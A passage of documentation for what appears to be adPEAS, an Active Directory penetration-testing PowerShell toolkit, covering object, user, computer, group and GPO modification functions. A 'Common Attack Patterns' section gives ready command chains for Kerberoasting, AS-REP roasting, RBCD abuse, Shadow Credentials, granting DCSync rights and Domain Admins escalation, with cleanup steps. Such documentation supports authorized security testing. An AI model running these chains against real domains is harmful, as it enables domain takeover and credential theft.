            +-> Invoke-LDAPSearch -Raw (get nTSecurityDescriptor bytes)
            |
            +-> ActiveDirectorySecurity (parse/modify ACL)
            |
            +-> ModifyRequest (write nTSecurityDescriptor bytes)
            |
            +-> $Script:LdapConnection.SendRequest()
```

### Available Operations

| Operation | Parameter | Description |
|-----------|-----------|-------------|
| **Set Attributes** | `-Set` | Replace attribute values |
| **Append Values** | `-Append` | Add to multi-valued attributes |
| **Remove Values** | `-Remove` | Remove from multi-valued attributes |
| **Clear Attributes** | `-Clear` | Remove all values from attributes |
| **Grant ACE** | `-GrantACE -Principal -Rights` | Add Allow ACE |
| **Revoke ACE** | `-RevokeACE -Principal -Rights` | Remove ACE |
| **Deny ACE** | `-DenyACE -Principal -Rights` | Add Deny ACE |
| **Clear ACE** | `-ClearACE -Principal` | Remove all ACEs for principal |
| **Set Owner** | `-SetOwner -Principal` | Change object owner |

### Parameters (Attribute Operations)

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Identity` | String | Object identity (sAMAccountName, DN, SID) |
| `-SearchBase` | String | Alternative SearchBase (DN) |
| `-Set` | Hashtable | Attributes to set (replace values) |
| `-Append` | Hashtable | Values to append (multi-valued attributes) |
| `-Remove` | Hashtable | Values to remove (multi-valued attributes) |
| `-Clear` | String[] | Attributes to clear (remove all values) |

### Parameters (ACL Operations)

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Principal` | String | Security principal (user/group) for ACL modification |
| `-Rights` | String | AD rights to grant/revoke (GenericAll, WriteDacl, etc.) |
| `-ExtendedRight` | String | Extended right alias (DCSync, ResetPassword, etc.) |
| `-GrantACE` | Switch | Add Allow ACE |
| `-RevokeACE` | Switch | Remove ACE |
| `-DenyACE` | Switch | Add Deny ACE |
| `-ClearACE` | Switch | Remove all ACEs for principal |
| `-SetOwner` | Switch | Change object owner |

### Extended Right Aliases

| Alias | Description |
|-------|-------------|
| `DCSync` | All 3 DCSync rights (Get-Changes + Get-Changes-All + Get-Changes-In-Filtered-Set) |
| `ForceChangePassword` | Reset user password (User-Force-Change-Password) |
| `ResetPassword` | Alias for ForceChangePassword |
| `AddMember` | Add to group (Self-Membership WriteProperty) |
| `SendAs` | Send as user (Exchange) |
| `ReceiveAs` | Receive as user (Exchange) |
| `ReadLAPSPassword` | Read LAPS password (ms-Mcs-AdmPwd ReadProperty) |
| `CertEnroll` | Certificate enrollment |
| `AutoEnroll` | Certificate auto-enrollment |
| `AllowedToAuthenticate` | Allowed to authenticate |
| `ReplicateDirectory` | Replicate directory changes |
| `InstallReplica` | Install domain replica |
| `CloneDC` | Clone a domain controller |
| `MigrateSIDHistory` | Migrate SID history |
| `ApplyGroupPolicy` | Apply group policy |
| `CreateGPOLink` | Create GPO link |
| `GenerateRSoPLogging` | Generate RSoP logging data |
| `GenerateRSoPPlanning` | Generate RSoP planning data |
| `ReanimateTombstones` | Reanimate tombstoned objects |
| `SelfMembership` | Add/remove self from group |
| `AllExtendedRights` | All extended rights (dangerous!) |

### Examples

```powershell
# Set attribute
Set-DomainObject -Identity "jdoe" -Set @{description = "Test User"}

# Append to multi-valued attribute
Set-DomainObject -Identity "jdoe" -Append @{servicePrincipalName = "HTTP/web01"}

# Remove specific value
Set-DomainObject -Identity "jdoe" -Remove @{servicePrincipalName = "HTTP/web01"}

# Clear attribute
Set-DomainObject -Identity "jdoe" -Clear @("description")

# Grant DCSync rights
Set-DomainObject -Identity "DC=contoso,DC=com" -Principal "CONTOSO\attacker" -ExtendedRight "DCSync" -GrantACE
# Attacker can now DCSync!

# Grant GenericAll on user
Set-DomainObject -Identity "CN=AdminUser,CN=Users,DC=contoso,DC=com" -Principal "CONTOSO\attacker" -Rights "GenericAll" -GrantACE

# Take ownership
Set-DomainObject -Identity "jdoe" -Principal "CONTOSO\newowner" -SetOwner

# Revoke ACE (cleanup)
Set-DomainObject -Identity "DC=contoso,DC=com" -Principal "CONTOSO\attacker" -ExtendedRight "DCSync" -RevokeACE
```

### Return Value

Returns `$true` on success, `$false` on failure.

---

## New-DomainUser

Creates a new user account in Active Directory via DirectoryEntry.

### Syntax

```powershell
New-DomainUser
    [-Name] <String>
    [-Password <String>]
    [-OrganizationalUnit <String>]
    [-Description <String>]
    [-Enabled <Boolean>]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Name` | String | sAMAccountName for the new user. Also used for CN and UPN. |
| `-Password` | String | Password for the new user (plaintext). If not specified, a random 20-character complex password is generated. |
| `-OrganizationalUnit` | String | DistinguishedName of the OU where the user should be created. Default: CN=Users,DC=domain,DC=com |
| `-Description` | String | Description attribute for the user account. |
| `-Enabled` | Boolean | Whether the account should be enabled after creation. Default: $true |
| `-PassThru` | Switch | Returns a result object instead of console output. Useful for scripting. |
| `-Domain` | String | Target domain (FQDN) |
| `-Server` | String | Specific Domain Controller to target |
| `-Credential` | PSCredential | PSCredential object for authentication |

### Examples

```powershell
# Create user with auto-generated password
New-DomainUser -Name "testuser"

# Create user with custom password
New-DomainUser -Name "testuser" -Password "P@ssw0rd123!"

# Create user in specific OU
New-DomainUser -Name "serviceaccount" -Password "C0mpl3x!" -OrganizationalUnit "OU=Service Accounts,DC=contoso,DC=com"

# Create disabled user
New-DomainUser -Name "serviceaccount" -Enabled $false

# Create user and capture result for scripting
$result = New-DomainUser -Name "testuser" -PassThru
if ($result.Success) {
    Write-Host "Password: $($result.Password)"
}
```

### Output (Console)

```
[+] Successfully created user: testuser
Distinguished Name                           CN=testuser,CN=Users,DC=contoso,DC=com
Enabled                                      True
Password (SAVE THIS!)                        K8#mP2@xL9!nQ4$wR7
```

### Output (-PassThru)

```powershell
[PSCustomObject]@{
    Operation = "CreateUser"
    User = "testuser"
    DistinguishedName = "CN=testuser,CN=Users,DC=contoso,DC=com"
    Enabled = $true
    Success = $true
    Message = "User successfully created"
    Password = "K8#mP2@xL9!nQ4$wR7"  # Only if auto-generated
}
```

---

## New-DomainComputer

Creates a new computer account in Active Directory via DirectoryEntry.

### Syntax

```powershell
New-DomainComputer
    [-Name] <String>
    [-Password <String>]
    [-OrganizationalUnit <String>]
    [-Description <String>]
    [-Enabled <Boolean>]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Name` | String | sAMAccountName for the new computer. Will automatically add $ suffix if not present. |
| `-Password` | String | Password for the new computer account (plaintext). If not specified, a random 20-character complex password is generated. |
| `-OrganizationalUnit` | String | DistinguishedName of the OU where the computer should be created. Default: CN=Computers,DC=domain,DC=com |
| `-Description` | String | Description attribute for the computer account. |
| `-Enabled` | Boolean | Whether the account should be enabled after creation. Default: $true |
| `-PassThru` | Switch | Returns a result object instead of console output. Useful for scripting. |
| `-Domain` | String | Target domain (FQDN) |
| `-Server` | String | Specific Domain Controller to target |
| `-Credential` | PSCredential | PSCredential object for authentication |

### Use Cases

By default, MachineAccountQuota allows all domain users to create up to 10 computer objects. This can be exploited for:

- **RBCD Attacks**: Create computer account → Configure delegation → Impersonate users
- **Relay Attacks**: Create machine account for relay targets
- **Persistence**: Create hidden computer accounts

### Examples

```powershell
# Create computer with auto-generated password
New-DomainComputer -Name "FAKE-PC01"

# Create computer with custom password (for RBCD attacks)
New-DomainComputer -Name "RBCD-ATTACK" -Password "P@ssw0rd123!"

# Create computer in specific OU
New-DomainComputer -Name "TESTPC" -OrganizationalUnit "OU=Workstations,DC=contoso,DC=com"

# Create computer and capture password for scripting
$comp = New-DomainComputer -Name "BACKDOOR-PC" -PassThru
Write-Host "Computer created! Password: $($comp.Password)"
```

### Output (Console)

```
[+] Successfully created computer: FAKE-PC01$
Distinguished Name                           CN=FAKE-PC01,CN=Computers,DC=contoso,DC=com
DNS Hostname                                 FAKE-PC01.contoso.com
Enabled                                      True
Password (SAVE THIS!)                        X9@kL2#mP5!nQ8$wR3
```

### Output (-PassThru)

```powershell
[PSCustomObject]@{
    Operation = "CreateComputer"
    Computer = "FAKE-PC01$"
    DistinguishedName = "CN=FAKE-PC01,CN=Computers,DC=contoso,DC=com"
    DNSHostName = "FAKE-PC01.contoso.com"
    Enabled = $true
    Success = $true
    Message = "Computer successfully created"
    Password = "X9@kL2#mP5!nQ8$wR3"  # Only if auto-generated
}
```

---

## New-DomainGroup

Creates a new group object in Active Directory via DirectoryEntry.

### Syntax

```powershell
New-DomainGroup
    [-Name] <String>
    [-OrganizationalUnit <String>]
    [-Description <String>]
    [-GroupScope <String>]
    [-GroupType <String>]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Name` | String | sAMAccountName for the new group. |
| `-OrganizationalUnit` | String | DistinguishedName of the OU where the group should be created. Default: CN=Users,DC=domain,DC=com |
| `-Description` | String | Description attribute for the group. |
| `-GroupScope` | String | Group scope: `Global`, `Universal`, or `DomainLocal`. Default: Global |
| `-GroupType` | String | Group type: `Security` or `Distribution`. Default: Security |
| `-PassThru` | Switch | Returns a result object instead of console output. Useful for scripting. |
| `-Domain` | String | Target domain (FQDN) |
| `-Server` | String | Specific Domain Controller to target |
| `-Credential` | PSCredential | PSCredential object for authentication |

### Group Scopes

| Scope | Members From | Can Be Used In |
|-------|--------------|----------------|
| **Global** | Same domain only | Any domain in forest |
| **Universal** | Any domain in forest | Any domain in forest |
| **DomainLocal** | Any domain | Same domain only |

### Examples

```powershell
# Create global security group (default)
New-DomainGroup -Name "IT-Admins"

# Create universal security group
New-DomainGroup -Name "Enterprise-Admins-Custom" -GroupScope Universal

# Create domain-local group
New-DomainGroup -Name "Server-LocalAdmins" -GroupScope DomainLocal

# Create distribution group (for email)
New-DomainGroup -Name "EmailList" -GroupType Distribution -GroupScope Universal

# Create group in specific OU with description
New-DomainGroup -Name "DBAs" -OrganizationalUnit "OU=Groups,DC=contoso,DC=com" -Description "Database Administrators"

# Create and capture result
$result = New-DomainGroup -Name "TestGroup" -PassThru
```

### Output (Console)

```
[+] Successfully created group: IT-Admins
Distinguished Name                           CN=IT-Admins,CN=Users,DC=contoso,DC=com
Type                                         Security
Scope                                        Global
```

### Output (-PassThru)

```powershell
[PSCustomObject]@{
    Operation = "CreateGroup"
    Group = "IT-Admins"
    DistinguishedName = "CN=IT-Admins,CN=Users,DC=contoso,DC=com"
    GroupType = "Security"
    GroupScope = "Global"
    Success = $true
    Message = "Group successfully created"
}
```

---

## New-DomainGPO

Creates a new Group Policy Object in Active Directory with proper SYSVOL folder structure.

### Syntax

```powershell
New-DomainGPO
    [-DisplayName] <String>
    [-NoSYSVOL]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `-DisplayName` | String | Display name for the new GPO (user-friendly name shown in GPMC). |
| `-NoSYSVOL` | Switch | Skip SYSVOL folder creation. Only the AD object will be created. The GPO will appear "broken" in GPMC until SYSVOL is populated manually. |
| `-PassThru` | Switch | Returns a result object instead of console output. Useful for scripting. |
| `-Domain` | String | Target domain (FQDN) |
| `-Server` | String | Specific Domain Controller to target |
| `-Credential` | PSCredential | PSCredential object for authentication |

### GPO Structure

When a GPO is created, it consists of two parts:

1. **AD Object**: `CN={GUID},CN=Policies,CN=System,DC=domain,DC=com`
   - Stores displayName, flags, versionNumber, gPCFileSysPath
   - Contains permissions (who can edit/apply)

2. **SYSVOL Folder**: `\\domain.com\SYSVOL\domain.com\Policies\{GUID}\`
   - `Machine\` - Machine configuration files
   - `User\` - User configuration files
   - `GPT.INI` - Version information

### Permission Mirroring

New-DomainGPO automatically mirrors AD object permissions to SYSVOL to prevent the GPMC "permissions inconsistent" warning:

| AD Object ACE | SYSVOL ACE |
|---------------|------------|
| GenericAll (0xF01FF/0xF00FF) | Full Control |
| GenericRead (0x20094) | Read & Execute |
| ExtendedRight (0x100) | Read & Execute |

### Examples

```powershell
# Create complete GPO (AD object + SYSVOL)
New-DomainGPO -DisplayName "Test Policy"

# Create GPO in remote domain
New-DomainGPO -DisplayName "Security Policy" -Domain "contoso.com" -Credential (Get-Credential)

# Create only AD object (no SYSVOL)
New-DomainGPO -DisplayName "AD Only GPO" -NoSYSVOL

# Create GPO and capture result for scripting
$result = New-DomainGPO -DisplayName "Audit Policy" -PassThru
if ($result.Success) {
    Write-Host "GPO GUID: $($result.GUID)"
    Write-Host "SYSVOL Created: $($result.SYSVOLCreated)"
}
```

### Output (Console)

```
[+] Successfully created GPO AD object: Test Policy
Distinguished Name                           CN={5C0EFBDD-70FB-4BA8-8965-1A015E7651FA},CN=Policies,CN=System,DC=contoso,DC=com
GUID                                         {5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}
SYSVOL Path                                  \\contoso.com\SysVol\contoso.com\Policies\{5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}
[+] SYSVOL folder structure created successfully
Machine folder                               \\dc01.contoso.com\SYSVOL\contoso.com\Policies\{5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}\Machine
User folder                                  \\dc01.contoso.com\SYSVOL\contoso.com\Policies\{5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}\User
GPT.INI                                      \\dc01.contoso.com\SYSVOL\contoso.com\Policies\{5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}\GPT.INI
```

### Output (-PassThru)

```powershell
[PSCustomObject]@{
    Operation = "CreateGPO"
    DisplayName = "Test Policy"
    GUID = "{5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}"
    DistinguishedName = "CN={5C0EFBDD-70FB-4BA8-8965-1A015E7651FA},CN=Policies,CN=System,DC=contoso,DC=com"
    SYSVOLPath = "\\contoso.com\SysVol\contoso.com\Policies\{5C0EFBDD-70FB-4BA8-8965-1A015E7651FA}"
    SYSVOLCreated = $true
    Success = $true
    Message = "GPO created successfully (AD object + SYSVOL)"
}
```

### Notes

- GPO is created without any settings (empty policy)
- Use `Set-DomainGPO` or GPMC to configure settings
- Link GPO to OUs using `Set-DomainGPO -Link` or GPMC
- If SYSVOL creation fails, the AD object is still created but GPO will appear broken in GPMC

---

## Common Attack Patterns

### 1. Kerberoasting Chain

```powershell
# Add SPN to high-value account
Set-DomainUser -Identity "svc_backup" -SetSPN "HTTP/fake.contoso.com"

# Kerberoast the account
Invoke-Kerberoast -Identity "svc_backup"

# Cleanup
Set-DomainUser -Identity "svc_backup" -ClearSPN "HTTP/fake.contoso.com"
```

### 2. ASREPRoasting Chain

```powershell
# Disable pre-authentication
Set-DomainUser -Identity "targetuser" -DontReqPreauth

# Roast the account
Invoke-ASREPRoast -Identity "targetuser"

# Cleanup
Set-DomainUser -Identity "targetuser" -ClearDontReqPreauth
```

### 3. RBCD Attack Chain

```powershell
# Create computer account
$pc = New-DomainComputer -Name "RBCD-ATTACK" -PassThru

# Configure RBCD on target
Set-DomainComputer -Identity "DC01" -AddRBCD "RBCD-ATTACK$"

# Get TGT for attack computer
$tgt = Invoke-KerberosAuth -UserName "RBCD-ATTACK$" -Domain "contoso.com" -Password $pc.Password

# Cleanup
Set-DomainComputer -Identity "DC01" -ClearRBCD -Force
```

### 4. Shadow Credentials Chain (PKINIT without CA)

Shadow Credentials allow PKINIT authentication **without requiring a Certificate Authority**. The certificate is self-signed and validated via the public key stored in `msDS-KeyCredentialLink`.

**Prerequisite:** Domain Functional Level **2016 or higher**. The `msDS-KeyCredentialLink` attribute only exists from DFL 2016 onwards.

```powershell
# Step 1: Add Shadow Credential (generates RSA key pair + self-signed certificate)
$result = Set-DomainUser -Identity "admin" -AddShadowCredential -PassThru

# Output includes:
# - PFXPath: Path to generated certificate
# - PFXPassword: Auto-generated password
# - DeviceID: For targeted cleanup

# Step 2: Use certificate for PKINIT authentication
Connect-adPEAS -Domain "contoso.com" -Certificate $result.PFXPath -CertificatePassword $result.PFXPassword

# You are now authenticated as "admin"!

# Step 3: Cleanup - remove specific Shadow Credential
Set-DomainUser -Identity "admin" -ClearShadowCredentials -DeviceID $result.DeviceID
```

**How it works**:
1. adPEAS generates an RSA-2048 key pair
2. The public key is stored in `msDS-KeyCredentialLink` (KEYCREDENTIALLINK_BLOB format)
3. A self-signed X.509 certificate is created with Smart Card Logon + Client Auth EKUs
4. The KDC validates PKINIT by checking the public key in AD (not via CA trust)

**Works on Computer accounts too** (e.g., for DCSync):
```powershell
$result = Set-DomainComputer -Identity "DC01" -AddShadowCredential -PassThru
Connect-adPEAS -Domain "contoso.com" -Certificate $result.PFXPath -CertificatePassword $result.PFXPassword
# Now authenticated as DC01$ - DCSync possible!
```

See [Authentication-Methods](03-Authentication-Methods.md#certificate-pkinit) for more PKINIT details.

### 5. Group Privilege Escalation

```powershell
# Add to Domain Admins (requires WriteMembers)
Set-DomainGroup -Identity "Domain Admins" -AddMember "attacker"

# Cleanup
Set-DomainGroup -Identity "Domain Admins" -RemoveMember "attacker"
```

---

## Cleanup Best Practices

> **Always clean up after testing!**

1. **Remove added SPNs**
   ```powershell
   Set-DomainUser -Identity "target" -ClearSPN "HTTP/fake.contoso.com"
   ```

2. **Re-enable pre-authentication**
   ```powershell
   Set-DomainUser -Identity "target" -ClearDontReqPreauth
   ```

3. **Remove RBCD configurations**
   ```powershell
   Set-DomainComputer -Identity "DC01" -ClearRBCD -Force
   ```

4. **Remove Shadow Credentials**
   ```powershell
   Set-DomainUser -Identity "target" -ClearShadowCredentials -Force
   ```

5. **Remove from groups**
   ```powershell
   Set-DomainGroup -Identity "Domain Admins" -RemoveMember "attacker"
   ```

6. **Revoke ACL changes**
   ```powershell
   Set-DomainObject -Identity "DC=contoso,DC=com" `
       -RevokeACE -Principal "CONTOSO\attacker" -ExtendedRight "DCSync"
   ```

7. **Restore certificate templates** (if backed up)
   ```powershell
   # Restore from backup...
   Set-CertificateTemplate -Identity "WebServer" `
       -DisableEnrolleeSuppliesSubject -AddManagerApproval
   ```

---

## PassThru for Scripting

All Set-* functions support `-PassThru` for programmatic use:

```powershell
$result = Set-DomainUser -Identity "target" -SetSPN "HTTP/test" -PassThru

if ($result.Success) {
    Write-Host "SPN added successfully"
    Write-Host "User is now Kerberoastable!"
} else {
    Write-Host "Failed: $($result.Message)"
}
```

### Return Object Structure

```powershell
[PSCustomObject]@{
    Operation = "SetSPN"
    User = "target"                    # or Computer, Group, etc.
    DistinguishedName = "CN=..."
    Success = $true/$false
    Message = "Operation result"
    # Additional operation-specific properties
}
```

---

## Navigation

- [Previous: Core-Functions](06-Core-Functions.md)
- [Next: Helper-Functions](08-Helper-Functions.md)
- [Back to Home](00-Home.md)
